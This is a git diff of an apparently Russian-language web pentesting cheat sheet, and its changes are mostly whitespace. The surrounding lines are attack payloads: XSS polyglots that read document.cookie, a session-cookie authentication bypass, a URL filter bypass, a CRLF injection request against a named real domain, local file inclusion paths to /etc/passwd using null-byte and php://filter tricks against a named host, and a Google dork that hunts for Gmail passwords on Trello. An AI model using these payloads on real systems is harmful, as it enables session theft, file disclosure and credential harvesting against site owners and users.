@@ -17,7 +17,7 @@ d - (Оператор LIKE)
 
 '":;<>/\[]<script><h1>
   
-'';!--"<XSS>=&{()}`
+'';!--"<XSS>=&{()}
 
 < - &lt;
 > - &gt;
@@ -79,20 +79,25 @@ Polyglot XSS - Mathias Karlsson
 " onclick=alert(document.cookie)//<button ‘ onclick=alert(document.cookie)//> */ alert(1)//
 
 **Authentication bypass**
+
 В процессе аутентификации при доступе к веб-сайту, посетив ссылку для отмены подписки.
 PHPSESSID=xxx;
 
 **Link filter protection bypass**
+
 ?url=site%E3%80%82com
 
 **CRLF Injection**
+
 GET /qwerty%0ASet-Cookie:%20test=qwerty;domain=.beepcar.ru HTTP/1.1
 
 **robots.txt**
+
 Disallow - Запрет доступа всех роботов 
 Allow - Разрешает доступ к определенной части ресурса
 
 **LFI**
+
 /index.php?file=/../../../../../../etc/passwd 
 
 file=/../../../../../../etc/passwd.php%00 
@@ -106,4 +111,5 @@ php://filter/convert.base64-encode/resource=index
 http://xqi.cc/index.php?m=php://filter/convert.base64-encode/resource=index
 
 **google dork**
+
 «site:trello.com AND intext:@gmail\.com AND intext:password»
